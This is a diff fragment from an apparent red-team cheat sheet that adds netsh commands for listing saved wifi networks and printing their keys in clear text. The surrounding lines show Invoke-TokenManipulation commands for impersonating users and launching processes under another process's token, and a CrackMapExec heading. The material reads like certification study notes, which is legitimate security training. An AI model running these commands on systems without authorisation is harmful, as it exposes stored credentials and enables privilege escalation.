@@ -225,6 +225,17 @@ Invoke-TokenManipulation -ImpersonateUser -Username “domain\user"
 Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
 ```
 
+## Get the wifi password (Not CRTE)
+### Get saved wifi networks
+```
+netsh wlan show profiles
+```
+
+#### Get key from saved wifi network
+```
+netsh wlan show profiles name=<NAME> key=clear
+```
+
 ## Check Local Admin Access
 #### Crackmapexec
 ```
